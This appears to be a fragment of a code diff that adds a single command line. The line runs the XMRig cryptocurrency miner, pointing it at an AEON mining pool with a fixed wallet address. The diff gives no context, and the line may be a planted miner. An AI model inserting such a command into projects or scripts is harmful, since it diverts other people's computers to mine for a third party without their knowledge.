@@ -1,0 +1,1 @@
+xmrig.exe -a cryptonight-lite -o mine.aeon-pool.com:5555 -u WmsgUhkivsaMo1g6rZWuWeEk1jthhMydFHJyHnw73zL339XXwfW5Yrpj91DRkBP8xbDnm7RLLSvyu8RXAsYh526r2BpPvg3Yu -p x
